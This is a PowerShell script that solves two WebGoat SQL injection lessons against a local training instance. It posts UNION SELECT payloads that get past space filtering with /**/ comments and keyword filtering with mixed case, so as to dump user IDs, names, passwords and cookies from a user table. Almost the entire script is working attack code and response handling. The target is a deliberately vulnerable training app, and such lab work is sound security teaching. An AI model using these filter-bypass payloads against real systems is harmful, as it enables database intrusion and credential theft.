# SQL Injection - Bypass Input Validation to retrieve account info

$url = "http://localhost:8001/WebGoat/SqlInjectionMitigations/attack"
$webgoatSessionId = "4D47D02FC29A4040209EEF22C16D0E87"

$headers = @{
    "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0"
    "Accept" = "*/*"
    "Accept-Language" = "en-US,en;q=0.5"
    "Content-Type" = "application/x-www-form-urlencoded; charset=UTF-8"
    "X-Requested-With" = "XMLHttpRequest"
    "Origin" = "http://localhost:8001"
    "Referer" = "http://localhost:8001/WebGoat/start.mvc"
    "Cookie" = "JSESSIONID=$webgoatSessionId"
}

Write-Host "SQL Injection - Retrieving account information..." -ForegroundColor Green
Write-Host ""

Write-Host "=== Challenge 1: Space Filtering Bypass ===" -ForegroundColor Cyan

$payload1 = "Smith'/**/UNION/**/SELECT/**/userid,user_name,password,cookie,user_name,password,cookie/**/FROM/**/user_system_data;--"

Write-Host "Payload: $payload1" -ForegroundColor Yellow

try {
    $body = "userid_sql_only_input_validation=" + [System.Web.HttpUtility]::UrlEncode($payload1)
    
    $response = Invoke-WebRequest -Uri $url -Method POST -Headers $headers -Body $body -UseBasicParsing -ErrorAction Stop
    
    Write-Host ""
    Write-Host "Status: $($response.StatusCode) - SUCCESS!" -ForegroundColor Green
    Write-Host "Response:" -ForegroundColor Cyan
    Write-Host $response.Content
    
    try {
        $jsonResponse = $response.Content | ConvertFrom-Json
        
        if ($jsonResponse.output) {
            Write-Host ""
            Write-Host "=== Account Information Retrieved ===" -ForegroundColor Green
            $jsonResponse.output | ForEach-Object {
                Write-Host $_ -ForegroundColor White
            }
        }
        
        if ($jsonResponse.lessonCompleted) {
            Write-Host "Challenge 1 COMPLETED!" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Could not parse JSON response" -ForegroundColor Gray
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    
    if ($_.Exception.Message -match "401") {
        Write-Host "SESSION EXPIRED! Get new JSESSIONID from browser" -ForegroundColor Yellow
    }
}

Write-Host ""
Write-Host "=== Challenge 2: Keyword Filtering Bypass ===" -ForegroundColor Cyan

$payload2 = "Smith'/**/UnIoN/**/SeLeCt/**/userid,user_name,password,cookie,user_name,password,cookie/**/FrOm/**/user_system_data;--"

Write-Host "Payload: $payload2" -ForegroundColor Yellow

try {
    $body = "userid_sql_only_input_validation_on_keywords=" + [System.Web.HttpUtility]::UrlEncode($payload2)
    
    $response = Invoke-WebRequest -Uri $url -Method POST -Headers $headers -Body $body -UseBasicParsing -ErrorAction Stop
    
    Write-Host ""
    Write-Host "Status: $($response.StatusCode) - SUCCESS!" -ForegroundColor Green
    Write-Host "Response:" -ForegroundColor Cyan
    Write-Host $response.Content
    
    try {
        $jsonResponse = $response.Content | ConvertFrom-Json
        
        if ($jsonResponse.output) {
            Write-Host ""
            Write-Host "=== Account Information Retrieved ===" -ForegroundColor Green
            $jsonResponse.output | ForEach-Object {
                Write-Host $_ -ForegroundColor White
            }
        }
        
        if ($jsonResponse.lessonCompleted) {
            Write-Host "Challenge 2 COMPLETED!" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "Could not parse JSON response" -ForegroundColor Gray
    }
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
    
    if ($_.Exception.Message -match "401") {
        Write-Host "SESSION EXPIRED! Update session ID on line 5" -ForegroundColor Yellow
    }
}

Write-Host ""
Write-Host "=== Summary ===" -ForegroundColor Green
Write-Host "Bypass techniques:" -ForegroundColor Cyan
Write-Host "  1. /**/ comments to replace spaces" -ForegroundColor White
Write-Host "  2. Case mixing (UnIoN, SeLeCt, FrOm)" -ForegroundColor White